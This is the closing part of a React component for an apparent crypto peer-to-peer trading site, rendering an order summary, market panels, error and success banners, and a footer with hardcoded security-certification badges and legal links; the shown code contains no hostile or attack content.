      <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/10 to-emerald-900/10' : 'from-green-50 to-emerald-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-4 sm:p-6 mb-6 sm:mb-8 text-left backdrop-blur-sm`}>
        <h4 className={`font-semibold ${darkMode ? 'text-green-300' : 'text-green-900'} mb-3`}>Order Summary</h4>
        <div className={`space-y-2 text-xs sm:text-sm ${themeClasses.textSecondary}`}>
          <div className="flex justify-between">
            <span>Order ID:</span>
            <span className="font-mono text-xs">{orderId}</span>
          </div>
          <div className="flex justify-between">
            <span>Wallet:</span>
            <span className="font-mono text-xs">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
          </div>
          <div className="flex justify-between">
            <span>Asset:</span>
            <span className="text-right">{selectedToken?.name} ({selectedToken?.symbol})</span>
          </div>
          <div className="flex justify-between">
            <span>Amount:</span>
            <span className="text-right">{tradeAmount}</span>
          </div>
          <div className="flex justify-between">
            <span>Payment Method:</span>
            <span className="text-right">{selectedPaymentMethod}</span>
          </div>
          <hr className="my-3 sm:my-4" />
          <div className={`flex justify-between font-semibold ${darkMode ? 'text-green-300' : 'text-green-800'}`}>
            <span>Status:</span>
            <span>Processing</span>
          </div>
        </div>
      </div>

      <button
        onClick={handleFinish}
        className={`w-full sm:w-auto bg-gradient-to-r ${themeClasses.gradient} text-white px-6 sm:px-8 py-3 sm:py-4 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`}
      >
        Start New Session
      </button>
    </div>
  </div>
)}


                {/* Desktop: Crypto News - Below Asset Management */}
                <div className="hidden lg:block">
                  <CryptoNews darkMode={darkMode} themeClasses={themeClasses} />
                </div>
                </div>

                {/* Right Column - Market Data & Info */}
                <div className="space-y-4 sm:space-y-6 lg:space-y-8 mt-6 lg:mt-0">
                  {/* Desktop: Reviews first, Mobile: Reviews first */}
                  <Testimonials
                    testimonials={testimonials}
                    darkMode={darkMode}
                    themeClasses={themeClasses}
                  />

                  {/* Desktop: Exchange Rates second */}
                  <div className="hidden lg:block">
                    <ExchangeRates
                      exchangeRates={exchangeRates}
                      showRates={showRates}
                      setShowRates={setShowRates}
                      selectedFiat={selectedFiat}
                      setSelectedFiat={setSelectedFiat}
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>

                  {/* Mobile: Exchange Rates second */}
                  <div className="block lg:hidden">
                    <ExchangeRates
                      exchangeRates={exchangeRates}
                      showRates={showRates}
                      setShowRates={setShowRates}
                      selectedFiat={selectedFiat}
                      setSelectedFiat={setSelectedFiat}
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>

                  {/* Mobile: News third */}
                  <div className="block lg:hidden">
                    <CryptoNews darkMode={darkMode} themeClasses={themeClasses} />
                  </div>

                  {/* Desktop: Security Features third */}
                  <div className="hidden lg:block">
                    <SecurityFeatures
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>
                </div>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Error & Success Messages */}
      {error && (
        <div className={`mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${darkMode ? 'bg-red-900/10' : 'bg-red-50'} border ${darkMode ? 'border-red-800/30' : 'border-red-200'} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`}>
          <AlertCircle className="w-5 h-5 text-red-600 mr-3 flex-shrink-0" />
          <span className={`${darkMode ? 'text-red-300' : 'text-red-800'} text-sm sm:text-base`}>{error}</span>
        </div>
      )}
      {success && (
        <div className={`mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${darkMode ? 'bg-green-900/10' : 'bg-green-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`}>
          <CheckCircle className="w-5 h-5 text-green-600 mr-3 flex-shrink-0" />
          <span className={`${darkMode ? 'text-green-300' : 'text-green-800'} text-sm sm:text-base`}>{success}</span>
        </div>
      )}

      {/* Footer - Hidden on mobile when wallet is connected */}
      {!(isMobile && walletConnected) && (
        <footer className={`${themeClasses.cardBg}/80 backdrop-blur-xl border-t ${themeClasses.border} mt-12`}>
          <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-8 sm:py-12">
            <div className="text-center mb-6 sm:mb-8">
              <h3 className={`text-lg sm:text-xl font-semibold ${themeClasses.text} mb-2`}>Trusted & Verified Platform</h3>
              <p className={`text-sm ${themeClasses.textSecondary}`}>Industry-leading security and compliance standards</p>
            </div>
            
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 sm:gap-6">
              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-blue-500 to-blue-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  Audited by CertiK
                </div>
              </div>

              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-green-500 to-green-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  KYC/AML Compliant
                </div>
              </div>

              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-purple-500 to-purple-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  SSL Secured
                </div>
              </div>

              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-orange-500 to-orange-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  DappRadar Verified
                </div>
              </div>

              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-indigo-500 to-indigo-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  SOC 2 Certified
                </div>
              </div>

              <div className={`${darkMode ? 'bg-gray-800/50' : 'bg-gray-50/50'} border ${themeClasses.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`}>
                <div className={`w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-teal-500 to-teal-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg`}>
                  <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M3 6a3 3 0 013-3h10a1 1 0 01.8 1.6L14.25 8l2.55 3.4A1 1 0 0116 13H6a1 1 0 00-1 1v3a1 1 0 11-2 0V6z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className={`text-xs sm:text-sm font-medium ${themeClasses.text}`}>
                  ISO 27001
                </div>
              </div>
            </div>
            
            {/* Legal Links */}
           {/* Legal Links */}
<div className={`mt-8 pt-6 border-t ${themeClasses.border} flex flex-col sm:flex-row items-center justify-between gap-4`}>
  <div className="flex flex-wrap items-center justify-center gap-4 text-sm">
    <button
      onClick={() => setShowContact(true)}
      className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors duration-200`}
    >
      About Us
    </button>
<span className={`${themeClasses.textSecondary} hidden sm:inline`}>•</span>
    <button
      onClick={() => setShowScamAdvisory(true)}
      className={`${themeClasses.textSecondary} hover:text-red-600 transition-colors duration-200`}
    >
      Scam Advisory
    </button>
<span className={`${themeClasses.textSecondary} hidden sm:inline`}>•</span>
    <button
      onClick={() => setShowBugBounty(true)}
      className={`${themeClasses.textSecondary} hover:text-orange-600 transition-colors duration-200`}
    >
      Bug Bounty
    </button>
<span className={`${themeClasses.textSecondary} hidden sm:inline`}>•</span>
    <button
      onClick={() => setShowTerms(true)}
      className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors duration-200`}
    >
      Terms & Conditions
    </button>

    <span className={`${themeClasses.textSecondary} hidden sm:inline`}>•</span>

    <button
      onClick={() => setShowPrivacy(true)}
      className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors duration-200`}
    >
      Privacy Policy
    </button>
  </div>

  <div className={`text-sm ${themeClasses.textSecondary} text-center sm:text-right`}>
    <p>© 2025 Securep2p.pro. All rights reserved.</p>
    <p className="text-xs mt-1">Secure • Fast • Trusted</p>
  </div>
</div>

          </div>
        </footer>
      )}
    </div>
  );
}

export default App;